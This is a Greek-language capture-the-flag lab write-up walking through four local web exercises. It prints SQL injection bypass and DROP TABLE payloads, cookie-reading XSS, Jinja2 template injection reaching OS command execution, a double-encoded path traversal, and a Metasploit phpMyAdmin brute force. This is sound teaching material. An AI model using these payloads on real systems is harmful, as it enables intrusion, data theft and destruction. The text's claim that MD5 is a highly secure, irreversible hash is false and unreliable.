 CATEGORIZATION OF EXERCISES ACCORDING TO OWASP TOP 10 VULNERABILITIES

A01:2021 - Broken Access Control (Path Traversal/CWE-36: Absolute Path Traversal) - ASK4
A03:2021 - Injection (SQL Injection/CWE-89: Improper Neutralization of Special Elements used in an SQL Command) - ASK2
A03:2021 - Injection (SSTI - SERVER SIDE TEMPLATE INJECTION (jinja2)/CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine) - ASK3
A03:2021 - Injection (OS COMMAND INJECTION(SHELLSHOCK - BASH 4.3)/CWE-78: Improper Neutralization of Special Elements used in an OS Command/CVE 2014 6271) - ASK5 
A07:2021 – Identification and Authentication Failure (CWE-521 Weak Password Requirements and more specifically CWE-1391: Use of Weak Credentials which is the child of CWE-521) ASK1

https://owasp.org/www-project-top-ten/

OWASP

O OWASP (Open Worldwide Security Project) είναι ένα μη κερδοσκοπικό ίδρυμα που δουλεύει για να βελτιώσει την ασφάλεια του λογισμικού.
Μέσα από έργα λογισμικού ανοιχτού κώδικα που είναι υπό την ηγεσία της κοινότητας, εκατοντάδες τοπικά κεφάλαια παγκοσμίως, δεκάδες χιλιάδες μέλη και κορυφαίες εκπαιδευτικές συσκέψεις, το ίδρυμα OWASP είναι η πηγή που χρησιμοποιούν οι προγραμματιστές και οι τεχνολόγοι παγκοσμίως για να ασφαλίσουν το διαδίκτυο.

Οι ασκήσεις που έχουν αναπτυχθεί, έχουν κατηγοριοποιηθεί σύμφωνα με τους 10 σοβαρότερους κινδύνους ασφαλείας σε εφαρμογές διαδικτύου του OWASP.

ΑΣΚΗΣΗ 1 

ΠΕΡΙΓΡΑΦΗ

Στην πρώτη άσκηση έχει δημιουργηθεί μια εφαρμογή WordPress που είναι ένα ευρέως γνωστό σύστημα διαχείρησης περιεχομένου (CMS). Χρησιμοποιείται για το χτίσιμο διαδικτυακών σελιδών και την παροχή εξυπηρετητή σε αυτές.
Για την σωστή λειτουργία του, στηρίζεται σε μία βάση δεδομένων η οποία περιέχει όλα τα δομικά χαρακτηριστικά και δεδομένα του WordPress.

ΚΑΤΗΓΟΡΙΟΠΟΙΗΣΗ ΕΥΠΑΘΕΙΑΣ

A07:2021 – Identification and Authentication Failure (CWE-521 Weak Password Requirements και πιο συγκεκριμένα CWE-1391: Use of Weak Credentials που είναι υποκατηγορία ή, κατά τον OWASP, παιδί του CWE-521) 

ΣΤΟΧΟΣ

Εύρεση κωδικού του διαχειριστή στο phpMyAdmin και είσοδος στον λογαριασμό του στο WordPress.

ΣΗΜΑΙΑ

FLAG{6RUT3_f0RC3_Sp3c1al1st}

ΔΕΔΟΜΕΝΑ

IP εφαρμογής : 127.0.0.1
phpMyAdmin port : 8080
WordPress port : 8000

Πρώτη ευπάθεια : Αδύναμος κωδικός στο phpMyAdmin.
Δεύτερη ευπάθεια : Δυνατότητα αλλαγής του κωδικού του διαχειριστή στο WordPress μέσω του πίνακα wp_users στη βάση δεδομένων database.

Επιπλέον βοήθεια για την απόκτηση της σημαίας : Κατά την είσοδο στο WordPress υπάρχει ένα κρυπτογραφημένο μύνημα στα drafts. Πρέπει να αποκρυπτογραφηθεί χρησιμοποιώντας κάποια στοιχεία που θα βρεθούν στον πίνακα Users της βάσης user_info στο phpMyAdmin. Ο αλγόριθμος κρυπτογράφησης είναι ο AES και η σημαία έχει επίσης κρυπτογραφηθεί σε Base-64.

ΒΗΜΑΤΑ ΑΣΚΗΣΗΣ

Το πρώτο βήμα της άσκησης είναι η είσοδος στο σύστημα διαχείρησης της βάσης δεδομένων του WordPress, το phpMyAdmin.
Για την απόκτηση εισόδου, πρέπει ο χρήστης να εισάγει τα στοιχεία του στην φόρμα σύνδεσης και έπειτα να γίνει έλεγχος στην βάση για να εξακριβωθεί ότι τα στοιχεία που καταχωρήθηκαν είναι σωστά.
Η ευπάθεια βρίσκεται στον εξαιρετικά αδύναμο κωδικό πρόσβασης που έχει χρησιμοποιηθεί για την είσοδο στη βάση.
Για την εκμετάλλευση της ευπάθειας συστήνεται η επιλογή του πιο διαδεδομένου πλαισίου δοκιμών έγχυσης στον κόσμο,
αποκαλούμενο "metasploit-framework".
To metasploit έχει προεγκατεστημένα εκατοντάδες σενάρια γραμμένα σε διάφορες γλώσσες προγραμματισμού, ειδικά σχεδιασμένα για την εκμετάλλευση γνωστών και εξακριβωμένων ευπαθειών.
Για την είσοδο στην κονσόλα του metasploit, γίνεται εισαγωγή της εντολής
./msfconsole
Παρακάτω φαίνεται και γραφική διεπαφή του metasploit:
[msf_console_image]

Για την εκμετάλλευση της ευπάθειας του αδύναμου κωδικού, θα γίνει χρήση των ακόλουθων εντολών:
[payloads_image]
Με την πρώτη εντολή εμφανίζονται τα διαθέσιμα payloads για το phpMyAdmin και με την δεύτερη επιλέγεται το payload που είναι κατάλληλο για bruteforce.
Για την εκτέλεση του payload είναι απαραίτητη η εισαγωγή παραμέτρων. Με τη χρήση της εντολής info παρουσιάζονται οι διαθέσιμοι παράμετροι για το συγκεκριμένο payload:
[info_image]
Στη στήλη "Required" παρατηρούνται οι απαραίτητοι παράμετροι που χρειάζονται για να εκτελεστεί το σενάριο.

ΕΠΕΞΗΓΗΣΗ ΠΑΡΑΜΕΤΡΩΝ

PASS_FILE 
Το αρχείο με τη λίστα των λέξεων που θα δοκιμαστούν μέχρι να βρεθεί η σωστή.
Για τις ανάγκες της άσκησης παρέχεται το αρχείο wordlist.txt 
https://github.com/kkrypt0nn/wordlists/blob/main/passwords/common_passwords_win.txt

RHOSTS
Εδώ δίνεται ο στόχος της επίθεσης, που είναι η IP του phpMyAdmin.

RPORT
Η θύρα που έχει καταλάβει το phpMyAdmin.

STOP_ON_SUCCESS
Επιλογή αν θα σταματήσει το σενάριο να εκτελείται όταν βρεθεί ο σωστός κωδικός ή όχι.

TARGETURI
Η τοποθεσία που βρίσκεται το phpMyAdmin, ή αλλιώς το directory/φάκελος.

USERNAME
Το Username είναι το όνομα χρήστη που χρησιμοποιείται για την είσοδο στο phpMyAdmin. Το προεπιλεγμένο όνομα χρήστη του διαχειριστή είναι το root. 

ΕΚΤΕΛΕΣΗ ΕΠΙΘΕΣΗΣ

Παρακάτω εισάγονται οι κατάλληλες τιμές στις παραπάνω παραμέτρους προκειμένου να εκτελεστεί ορθά το σενάριο.
[parameters_image]

Με την εισαγωγή της εντολής run αρχίζει η αυτόματη δοκιμή κωδικών από τη λίστα λέξεων. Μόλις βρεθεί η λέξη, η έρευνα σταματάει και πατώντας τον ευρεθέντα κωδικό στο phpMyAdmin αποκτάται είσοδος στoν λογαριασμό του διαχειριστή. Παρακάτω φαίνονται μερικοί απο τους κωδικούς που δοκιμάστηκαν, με τελευταίο να είναι ο σωστός, όπου και σταμάτησε η εκτέλεση του payload.
[bruteforce_image]

Μέσα στο phpmyadmin υπάρχει μια βάση δεδομένων που λέγεται Users. Μέσα στη βάση υπάρχει ένας πίνακας με όνομα user_info. Πατώντας πάνω και κοιτώντας τις εγγραφές, παρατηρούνται κάποια χρήσιμα στοιχεία στην 8η σειρά:
[user_info_table_image]

CBC (Cipher Block Chaining) : Είναι ένας από τους τρόπους λειτουργίας ενός κώδικα block. Μια ακολουθία από bits αποκρυπτογραφούνται ως μια ενιαία μονάδα.

secretsecretsecr : To κλειδί της ακολουθίας

128 : Tο μέγεθος του κλειδιού.

Από τα παραπάνω συμπεραίνεται ότι υπάρχει κάπου ένα μήνυμα κρυπτογραφημένο σε AES. Όταν βρεθεί, θα χρησιμοποιηθούν τα παραπάνω στοιχεία για να αποκρυπτογραφηθεί.

Το επόμενο βήμα είναι να αποκτηθεί πρόσβαση στο WordPress. Αυτό μπορεί να επιτευχθεί με την είσοδο στη βάση database και πιο συγκεκριμένα στον πίνακα wp_users.
[wp_users_image]

Το όνομα χρήστη είναι admin και ο κωδικός είναι μια συμβολοσειρά κρυπτογραφημένη με MD5 που είναι ένας από τους πιο ασφαλείς αλγόριθμους hash. Είναι πρακτικά αδύνατο να αντιστραφεί αυτός ο αλγόριθμος και να διαβαστεί το αρχικό μήνυμα.
Υπάρχει όμως τρόπος να αποκτηθεί πρόσβαση στο WordPress χωρίς να είναι γνωστός ο κωδικός.
Πηγαίνοντας σε μια σελίδα κρυπτογράφησης συμβολοσειρών σε MD5, μπορεί ο χρήστης να πληκτρολογήσει μια συμβολοσειρά της επιλογής του και να την κρυπτογραφήσει.
[encrypt_to_MD5_image]
Έπειτα αντιγράφει το αποτέλεσμα και αφού κάνει edit το πεδίο του κωδικού, αντικαθιστά τη παλιά συμβολοσειρά με τη νέα.
Πληκτρολογώντας τον νέο κωδικό στη σελίδα του WordPress, αποκτάται πρόσβαση στο λογαριασμό του διαχειριστή.
[wordpress_image]

Στα Recent Drafts υπάρχει ένα αποθηκευμένο μήνυμα με τίτλο Secret.
Αντιγράφοντας το μήνυμα, επικολλώντας το σε μια σελίδα αποκρυπτογράφησης AES και χρησιμοποιώντας τα στοιχεία που δόθηκαν από τον πίνακα users_info στο phpMyAdmin, δίνεται το αποτέλεσμα και η άσκηση έχει λυθει με επιτυχία.
[final_message_image]
[final_message_image_2]
ΜΕΡΟΣ 2 ΕΙΣΟΔΟΣ ΣΤΟ WORDPRESS - ΑΛΛΑΓΗ ΚΩΔΙΚΟΥ ΤΟΥ ADMIN
(credits : https://firstsiteguide.com/hack-wordpress-complete-guide/)
Έχουμε μπει στο phpmyadmin και έχουμε πρόσβαση στη βάση του wordpress.
1) Ψάχνουμε το table που λέγεται wp_users. Αυτός ο πίνακας φυλάει όλους τους χρήστες του wordpress.
2) Ελέγχουμε το password field. Έχει μια συμβολοσειρά που αναπαριστά τον κωδικό, αλλά είναι κρυπτογραφημένη με MD5 που είναι πολύ δύσκολο να σπάσει. 
Δεν χρειάζεται όμως να τον σπάσουμε.
3) Κάνουμε google MD5 generator. Εκεί πατάμε μια συμβολοσειρά (όποια θέλουμε) και κάνουμε copy το αποτέλεσμα.
4) Πάμε πίσω στο phpmyadmin και κάνουμε edit το password. Κάνουμε paste την νέα μας συμβολοσειρά.
5) Πάμε στο wordpress και κάνουμε login με το password που βάλαμε.
Μπήκαμε στο wordpress.


ΜΕΡΟΣ 3 ΑΠΟΚΡΥΠΤΟΓΡΑΦΗΣΗ ΤΟΥ ΤΕΛΙΚΟΥ ΜΗΝΥΜΑΤΟΣ 
Είμαστε πλέον μέσα στο wordpress. Ψάχνοντας λίγο τριγύρω, βλέπουμε ότι στα post υπάρχει μια εγγραφή που λέγεται "Click me".
Πατώντας εκεί, μπαίνουμε σε μια δημοσίευση και βλέπουμε μια συμβολοσειρά. Χρησιμοποιώντας ένα online εργαλείο αποκρυπτογράφησης AES 
και τα στοιχεία που μαζέψαμε στο πρώτο κομμάτι (CBC,κλειδί,μήκος κλειδιού) αποκρυπτογραφούμε το μήνυμα και βλέπουμε ότι λέει : 
"Challenge Solved! Congrats!"



ΑΣΚΗΣΗ 2

ΠΕΡΙΓΡΑΦΗ

Στη δεύτερη άσκηση έχει δημιουργηθεί μια δικτυακή εφαρμογή με την χρήση της σεναριακής γλώσσας προγραμματισμού php. Η εφαρμογή είναι συνδεδεμένη με μια βάση δεδομένων SQL και περιλαμβάνει πληθώρα ευπαθειών.

ΚΑΤΗΓΟΡΙΟΠΟΙΗΣΗ ΕΥΠΑΘΕΙΑΣ

A03:2021 - Injection (SQL Injection/CWE-89: Improper Neutralization of Special Elements used in an SQL Command)
A03:2021 - Injection (XSS Attack/CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS))

ΣΤΟΧΟΣ

Στόχος της άσκησης είναι κυρίως η εξοικείωση του χρήστη με επιθέσεις SQL Injection. Θα πρέπει αρχικά να παρακάμψει την φόρμα σύνδεσης, έπειτα να διαβάσει το session cookie και τα email του διαχειριστή και τέλος να διαγράψει τον πίνακα με όνομα "emails" από την βάση δεδομένων.

ΣΗΜΑΙΑ

FLAG{Pr0f3ss1on4l-SQL-1nj3ct0r}

ΔΕΔΟΜΕΝΑ

IP εφαρμογής : 127.0.0.1
Port Εφαρμογής : 8002

Πρώτη ευπάθεια : Απουσία μηχανισμών εξουδετέρωσης ειδικών χαρακτήρων που έχει ως αποτέλεσμα την δυνατότητα έγχυσης κώδικα SQL.
Δεύτερη ευπάθεια : Απουσία μηχανισμών εξουδετέρωσης ετικετών HTML που σχετίζονται με σενάρια.

Επιπλέoν Δεδομένα

1) Ερώτημα που χρησιμοποιήθηκε για έλεγχο των στοιχείων χρήστη στην φόρμα σύνδεσης :
    $query = "select * from user_table where user_name = '$user_name' and password='$password'";
    
2) Ερώτημα που χρησιμοποιήθηκε για έλεγχο του κώδικου που θα δώσει πρόσβαση στα email του διαχειριστή :
    $query = "select * from user_table where email_password = ('$email_password') and user_id = '305' ";
    To user_id εδώ είναι λάθος και θα πρέπει να παρακαμφθεί.


ΒΗΜΑΤΑ ΑΣΚΗΣΗΣ

Το πρώτο βήμα της άσκησης είναι η είσοδος στο λογαριασμό του διαχειριστή. Για να επιτευχθεί αυτό θα πρέπει ο χρήστης να παρακάμψει την φόρμα σύνδεσης μέσω επίθεσης SQL Injection. 
Πληκτρολογώντας localhost:8002 σε έναν φυλλομετρήτη, παρουσιάζεται η εξής ιστοσελίδα:
[login_page_image]
Παρατηρώντας την δοθείσα εντολή SQL, μπορεί κανείς να συμπεράνει ότι δεν υπάρχει κάποιος μηχανισμός εξουδετέρωσης ειδικών χαρακτήρων. Επίσης, το όνομα χρήστη όπως και ο κωδικός διαβάζονται κατευθείαν από τα δεδομένα εισόδου που θα δώσει ο χρήστης.
Πληκτρολογώντας την εντολή 'or'1'='1 στο πεδίο password, το ερώτημα SQL θα μετατραπεί σε "select * from user_table where user_name = '$user_name' and password='' or '1'='1';"
Για την καλύτερη κατανόηση του παραπάνω ερωτήματος, παρακάτω φαίνεται το αποτέλεσμα που παράγεται όταν εκτελεστεί το ερώτημα στo phpmyadmin : 
[sql_injection_1_phpmyadmin_image]

Όπως φαίνεται, το ερώτημα που συντάχθηκε θα κάνει select όλες τις εγγραφές της βάσης. Ο λόγος που συμβαίνει αυτό είναι επειδή δίνεται στην ουσία εντολή στην βάση δεδομένων να επιστρέψει όλες τις εγγραφές όπου το username και το password είναι ίδιο με αυτό που έδωσε ο χρήστης ή 1=1. Το 1=1 επιστρέφει πάντα true, άρα θα επιστραφούν όλα τα αποτελέσματα της βάσης. Ο λόγος που επιτρέπεται η πρόσβαση στον λογαριασμό του admin και όχι του mike, είναι επειδή η γραμμή με τα στοιχεία του admin προηγείται στη βάση δεδομένων.

Αφού αποκτήθηκε είσοδος στο λογαριασμό του admin, εμφανίζεται η ακόλουθη σελίδα:
[index_page_image]

Αρχικά θα γίνει δοκιμή στο πρώτο πεδίο. Πληκτρολογώντας ένα οποιοδήποτε όνομα, παράγεται το εξής αποτέλεσμα:
[xss_name_test_image]

Μπορεί να καταλάβει κανείς ότι εδώ πρόκειται για επίθεση XSS. Για να εξακριβωθεί αυτή η υπόθεση, θα δοκιμαστεί το πιο γνωστό σενάριο javascript το οποίο εμφανίζει μια ειδοποίηση στον φυλλομετρήτη:
[xss_script_test]
Με την εκτέλεση αυτού του σεναρίου παρουσιάζεται επιτυχώς η ειδοποίηση στην οθόνη. Το επόμενο λοιπόν βήμα είναι να αποκτηθεί το cookie της συνεδρίας. Αυτό μπορεί να επιτευχθεί με την εισαγωγή της εντολής <script>alert(document.cookie)</script>
Πληκτρολογώντας την συγκεκριμένη εντολή στο πεδίο, παράγεται το ακόλουθο αποτέλεσμα:
[first_half_flag_image]
Αποκτήθηκε με επιτυχία το πρώτο κομμάτι της σημαίας.
Σειρά έχει το πεδίο που απαιτεί εισαγωγή κωδικού προκειμένου να εμφανιστούν τα email.
Πληκτρολογώντας την εντολή:
 ') or '1'='1'-- 
στο πεδίο, το ερώτημα SQL θα μετατραπεί σε "select * from user_table where email_password = ('') or '1'='1'--  and user_id = '305'"
Μετά τις διπλές παύλες, πρέπει να πατηθεί και spacebar, για να εφαρμοστεί σωστά το σχόλιο.
Με το παραπάνω ερώτημα κλείνει το μονό εισαγωγικό και η παρένθεση του email_password και εφαρμόζεται ένα or το οποίο σημαίνει ότι πρέπει να βρεθεί εγγραφή στη βάση όπου υπάρχει κενό email_password ή 1=1. Το υπόλοιπο ερώτημα παρακάμπτεται λόγω της διπλής παύλας, οπότε εμφανίζονται με επιτυχία τα email:
[sql_injection_2_image]
Για την καλύτερη κατανόηση του παραπάνω ερωτήματος, θα εφαρμοστεί και στο phpmyadmin:
[sql_injection_2_phpmyadmin_image]

Στη δεύτερη σειρά του πίνακα με τα email, αναγράφεται ότι πρέπει να σβηστεί ο πίνακας με όνομα emails από την βάση για να ολοκληρωθεί η πρόκληση. 
Χρησιμοποιώντας την εντολή ');drop table emails;-- το έρωτημα μετατρέπεται σε "select * from user_table where email_password = ('');drop table emails;-- and user_id = '305'"
Παρόμοια με το προηγούμενο μέρος, αρχικά κλείνει το μονό εισαγωγικό και την παρένθεση του email. Έπειτα εφαρμόζεται ερωτηματικό για να σημανθεί το τέλος της εντολής και εισάγεται η δεύτερη εντολή που έχει ως αποτέλεσμα την διαγραφή του πίνακα ονόματι emails. Τέλος εφαρμόζονται διπλές παύλες για να μπει το υπόλοιπο του αρχικού ερωτήματος σε σχόλιο.
Μετά την εφαρμογή του ερωτήματος στο πεδίο, παρατηρείται ότι ο πίνακας έχει διαγραφεί από τη βάση:
[emails_gone_image]
Πληκτρολογώντας την εντολή του προηγούμενου ερωτήματος για να εμφανιστεί ο πίνακας με τα email, εμφανίζεται μήνυμα λάθους μαζί με τη σημαία:
[flag_image]

ΑΣΚΗΣΗ 3

ΠΕΡΙΓΡΑΦΗ

Στην τρίτη άσκηση έχει αναπτυχθεί μια εφαρμογή χρησιμοποιώντας Flask που είναι ενα διαδικτυακό
framework γραμμένο σε python. Επιπλέον, χρησιμοποιείται και Jinja2 που είναι μια μοντέρνα γλώσσα προτύπων και χρησιμεύει στη ανάπτυξη σελιδών HTML,XML και άλλων format. Η ευπάθεια βρίσκεται στη συνάρτηση render_template_string η οποία δέχεται τα πρότυπα. Μπορεί να
τροποποιηθεί μέσω του URL και να εκτελεστούν εντολές επιπέδου λειτουργικού συστήματος..

ΚΑΤΗΓΟΡΙΟΠΟΙΗΣΗ ΕΥΠΑΘΕΙΑΣ

A03:2021 - Injection (SSTI - SERVER SIDE TEMPLATE INJECTION (jinja2)/CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine)

ΣΤΟΧΟΣ

Στόχος της άσκησης είναι η εκμάθηση έγχυσης προτύπων σε web εφαρμογές. Θα πρέπει αρχικά να βρεθεί η ευπαθής παράμετρος και έπειτα να συνταχθει το κατάλληλο πρότυπο για την ανάγνωση της κρυφής σημαίας που βρίσκεται στο directory της εφαρμογής.

ΣΗΜΑΙΑ

FLAG{M4ster_Jinj4}

ΔΕΔΟΜΕΝΑ

IP εφαρμογής : 127.0.0.1
Port Εφαρμογής : 5050

Ευπάθεια: Δυνατότητα έγχυσης προτύπου μέσα σε παράμετρο του URL της εφαρμογής.

Επιπλέoν Δεδομένα:

1) Θα πρέπει αρχικά να διαβαστούν οι τιμές διάρθρωσης της εφαρμογής (configuration values)
   Εκεί βρίσκεται το πρώτο κομμάτι της σημαίας. Για το δεύτερο, θα πρέπει να αναγνωστούν τα περιεχόμενα του αρχείου flag.txt που βρίσκεται στον φάκελο της εφαρμογής. 

2) Η σημαία είναι κρυπτογραφημένη με αλγόριθμο κρυπτογράφησης Vigenere.

ΒΗΜΑΤΑ ΑΣΚΗΣΗΣ

Πληκτρολογώντας "localhost:5050" σε οποιονδήποτε φυλλομετρητή, αποκτάται πρόσβαση στην κεντρική σελίδα της εφαρμογής, η οποία είναι η ακόλουθη:
[main_page_image]

Η σελίδα δεν δίνει κάποιο στοιχείο για το ποια είναι η ευπάθεια, ούτε έχει κάποιο πεδίο εισαγωγής χαρακτήρων.
Το πρώτο βήμα λοιπόν είναι να ελεγχθεί η πηγή της σελίδας. Ρίχνοντας μια ματιά στον κώδικα HTML, παρατηρείται το εξής:
[html_source_image]
Υπάρχει ένα σχόλιο που γνωστοποιεί ότι έχει χρησιμοποιηθεί Jinja2 στην εφαρμογή. Αυτό θα βοηθήσει στην κατάλληλη σύνταξη των προτύπων για την έγχυση. Είναι όμως αναγκαίες περαιτέρω πληροφορίες.
Μεταβαίνοντας στο αρχείο css της εφαρμογής, αποκτάται μια ακόμα πληροφορία:
[css_source_image]
Πλέον είναι γνωστή τόσο η μηχανή σύνταξης προτύπων, όσο και η ευπαθής παράμετρος οπότε μπορεί να ξεκινήσει η επίθεση.
Δοκιμάζοντας την παράμετρο στο URL της εφαρμογής με μια τυχαία τιμή, εμφανίζεται η παρακάτω σελίδα:
[parameter_test_image]
Σύμφωνα με το official documentation του Jinja2, τα πρότυπα εφαρμόζονται μέσα σε διπλές αγκύλες. Για την εξακρίβωση αυτής της πληροφορίας, μπορεί να τελεστεί μια απλή πράξη πολλαπλασιασμού μέσα στην παράμετρο:
[jinja2_multiplication_image] 
Η πράξη τελέστηκε σωστά οπότε η ευπάθεια είναι πλέον ξεκάθαρη. 
Το επόμενο βήμα είναι η ανάγνωση των τιμών διάρθρωσης της εφαρμογής. Αυτό μπορεί να επιτεχθεί με την εισαγωγή της ακόλουθης εντολής ως πρότυπο:
?name={{config.items()}}
H παραπάνω εντολή χρησιμοποιεί την μέθοδο items() της κλάσης config, η οποία εμφανίζει τις τιμές διάρθρωσης.
Παρουσιάζεται το παρακάτω αποτέλεσμα:
[first_half_flag_image]
Ιδιαίτερο ενδιαφέρον προκαλεί η τιμή που αποκαλείται "SECRET_KEY". Περιέχει το πρώτο μέρος της σημαίας κρυπτογραφημένο σε Vigenere. 
Επόμενο βήμα είναι να αναγνωστεί το περιέχομενο του αρχείου flag.txt για την απόκτηση του δεύτερου μέρους της σημαίας.
Αρχικά πρέπει να γνωστοποιηθούν τα περιεχόμενα του φακέλου της εφαρμογής. Για να επιτευχθεί αυτό, χρησιμοποιείται το template "{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}"
[current_directory_template_image]
Ανάμεσα στα αρχεία που εμφανίστηκαν, υπάρχει και το flag.txt που περιέχει το άλλο μισό της σημαίας.

ΕΠΕΞΗΓΗΣΗ ΠΡΟΤΥΠΟΥ:
 config.class : Η βασική κλάση που χρησιμοποιείται για την φόρτωση διαρθρώσεων.
 from_envvar.globals : Επιλέγει τις περιβαλλοντικές μεταβλητές και κάνει χρήση των καθολικών  μεταβλητών
 builtins.import("os") : Δίνει πρόσβαση σε όλα τα ενσωματωμένα αναγνωριστικά της python και χρησιμoποιεί το os που είναι ένας φορητός τρόπος για χρήση λειτουργικότητας βασισμένης σε λειτουργικά συστήματα.Με απλά λόγια θα δώσει πρόσβαση σε εκτέλεση εντολών επιπέδου λειτουργικού συστήματος.
 popen : Yποδιαδικασία που δημιουργεί μια σύνδεση μεταξύ του προγράμματος και της εντολής που εκτελέστηκε και επιστρέφει έναν δείκτη σε μια ροή που μπορεί να χρησιμοποιηθεί για την ανάγνωση ή την τύπωση στη σύνδεση αυτή. Μέσα στην διαδικασία αυτή εισάγεται η εντολή "ls" η οποία θα εμφανίσει ως αποτέλεσμα τα αρχεία που βρίσκονται στο τρέχοντα φάκελο.
 read : Διαβάζει το αποτέλεσμα που παράχθηκε από την εντολή ls και το τυπώνει στην οθόνη στη θέση της παραμέτρου.
 Με την χρήση των τελειών ανάμεσα σε κάθε εντολή ενώνονται οι ξεχωριστές εντολές σε μια ενίαια.

Το επόμενο βήμα είναι να βρεθεί το όνομα του φακέλου στον οποίο βρίσκεται η εφαρμογή. Αυτο μπορεί να επιτευχθεί χρησιμοποιώντας το ακόλουθο πρότυπο:
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cd ..;ls").read() }}
Το πρότυπο αυτό είναι σχεδόν ίδιο με το προηγούμενο. Αυτή τη φορά χρησιμοποιείται η εντολή "cd .." για να γίνει δρομολόγηση στον προηγούμενο φάκελο και μετά η εντολή ls για να εμφανιστούν τα περιεχόμενα του προηγούμενου φακέλου. Οι δύο εντολές χωρίζονται μεταξύ τους με την χρήση ερωτηματικού.
[previous_directory_image]
Ανάμεσα στα ονόματα φακέλων που εμφανίστηκαν, υπάρχει και το app το οποίο περιέχει την εφαρμογή. Το τελευταίο βήμα τώρα είναι να χτιστεί ένα τελικό πρότυπο το οποίο χρησιμοποιώντας την πλήρη τοποθεσία στην οποία βρίσκεται η σημαία, θα την ανοίξει.
Το κατάλληλο πρότυπο για να πραγματοποιηθεί αυτός ο στόχος είναι το εξής:
{{ get_flashed_messages.__globals__.__builtins__.open("/app/flag.txt").read() }}

ΕΠΕΞΗΓΗΣΗ ΠΡΟΤΥΠΟΥ:
 get_flashed_messages : Χρησιμοποιείται συνήθως για την εμφάνιση βοηθητικών μηνυμάτων στον πελάτη αφού τα αφαιρέσει από την τρέχουσα συνεδρία .Στην συγκεκριμένη περίπτωση θα χρησιμοποιηθεί για την τύπωση του περιεχομένου της σημαίας.
 globals : Χρησιμοποιεί τις καθολικές περιβαλλοντικές μεταβλητές
 builtins : Δίνει πρόσβαση στα αποθηκευμένα αναγνωριστικά της python
 open : Δέχεται το directory στο οποίο βρίσκεται το αρχείο και το ανοίγει.
 read : Διαβάζει τα περιεχόμενα και τα τυπώνει στην οθόνη.

Παρακάτω φαίνεται το αποτέλεσμα έπειτα από την εφαρμογή του παραπάνω προτύπου:
[last_part_of_flag_image]

Συνδέοντας και τα δύο μισά της σημαίας, παράγεται το εξής αποτέλεσμα:
PPYQ{Q4qdip_Tmlt4}

Η συμβολοσειρά είναι κρυπτογραφημένη με Vigenere οπότε χρησιμοποιώντας έναν online εργαλείο μετατροπής, αποκτάται η σημαία στη σωστή της μορφή:
[flag_image]


ΑΣΚΗΣΗ 4

ΠΕΡΙΓΡΑΦΗ

Στην τέταρτη άσκηση έχει δημιουργηθεί μια εφαρμογή σε php η οποία είναι ευπαθής σε επιθέσεις διάσχισης φακέλων. Αυτή η επίθεση είναι εφικτή όταν ο προγραμματιστής δεν εισάγει τους απαραίτητους ελέγχους για να εμποδίσει τον χρήστη από το να εισάγει κακόβουλο κώδικα σε παράμετρο που δέχεται το url μιας σελίδας. Έτσι, μπορεί να μετακινηθεί εκτός του φακέλου της εφαρμογής και να έχει την ελευθερία να ανοίξει και να διαβάσει οποιοδήποτε αρχείο βρίσκεται στην μηχανή.

ΚΑΤΗΓΟΡΙΟΠΟΙΗΣΗ ΕΥΠΑΘΕΙΑΣ

A01:2021 - Broken Access Control (Path Traversal/CWE-36: Absolute Path Traversal) - ASK4

ΣΤΟΧΟΣ

Στόχος της άσκησης είναι η εκμάθηση επιθέσεων διάσχισης φακέλων. Πρέπει να γίνει δρομολόγηση μέσα στον φάκελο που βρίσκεται η σημαία μέσω μιας ευπαθούς παραμέτρου κωδικοποιώντας κατάλληλα την τοποθεσία. 

ΣΗΜΑΙΑ

FLAG{D1r3ct0ry_Trav3rs3r}

ΔΕΔΟΜΕΝΑ

IP εφαρμογής : 127.0.0.1
Port Εφαρμογής : 8000

Ευπάθεια: Δυνατότητα διάσχισης φακέλων μέσω ευπαθούς παραμέτρου.

Επιπλέoν Δεδομένα:
Υπάρχει μηχανισμός προστασίας στην εφαρμογή που δεν επιτρέπει την εισαγωγή κάποιων χαρακτήρων. Θα πρέπει να κωδικοποιηθεί κατάλληλα το URL για να παρακαμφθεί αυτός ο μηχανισμός.

ΒΗΜΑΤΑ ΑΣΚΗΣΗΣ

Πληκτρολογώντας localhost:8000 σε οποιονδήποτε φυλλομετρητή, αποκτάται πρόσβαση στην ακόλουθη σελίδα:
[main_page_image]
Τα χρήσιμα στοιχεία είναι :
 Ο φάκελος που βρίσκεται η σημαία
 Το μήνυμα που αναφέρει ότι βρέθηκαν παράνομοι χαρακτήρες
 Το μήνυμα λάθους που μιλάει για κάποιο μη προσδιορισμένο κλειδί πίνακα που λέγεται "file"

Ο λόγος που εμφανίζεται το τελευταίο μήνυμα λάθους είναι επειδή δεν έχει δωθεί κάποια τιμή στην παράμετρο που ονομάζεται key.
Το πρώτο βήμα είναι η δοκιμή της τοποθεσίας που βρίσκεται η σημαία μέσα στην παράμετρο που ονομάζεται "file"
[flag_location_test_image]
To δεύτερο μήνυμα λάθους εξαφανίστηκε καθώς δόθηκε τιμή στην παράμετρο file, όμως το πρώτο παραμένει. 
Το επόμενο βήμα λοιπόν είναι να δοκιμαστεί κωδικοποίηση του URL.
Ισχύει ότι :
 / -> %2f
 . -> %2e
 
 Αντικαθιστώντας στο προηγούμενο URL παράγεται το ακόλουθο αποτέλεσμα:
[first_encoding_image]
Παρουσιάζεται για άλλη μια φορά το ίδιο λάθος. Ο λόγος που συμβαίνει αυτό είναι διότι η κωδικοποίηση που χρησιμοποιήθηκε, μεταφράζεται από τον φυλλομετρητή ακριβώς όπως οι απαγορευμένοι χαρακτήρες.
Η σωστή προσέγγιση λοιπόν, είναι να κωδικοποιηθεί ξεχωριστά ο κάθε κωδικοποιημένος χαρακτήρας.

Ισχύει ότι:
 % -> %25
 2 -> %32
 f -> %46
 e -> %45
 
Χρησιμοποιώντας τα παραπάνω, το URL θα μετατραπεί στην ακόλουθη μορφή :
%25%32%46home%25%32%46secret%25%32%46flag%25%32%45txt 

Αποκτήθηκε επιτυχώς πρόσβαση στο αρχείο με τη σημαία και τα περιέχομενά του εμφανίστηκαν στην οθόνη:
[flag_image]


ΑΣΚ3
credits: https://blog.logrocket.com/build-deploy-flask-app-using-docker/
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
https://flask.palletsprojects.com

ΑΣΚ4
credits: https://www.youtube.com/watch?v=rK5TFXom34w



ASKHSH 5

FLAG :
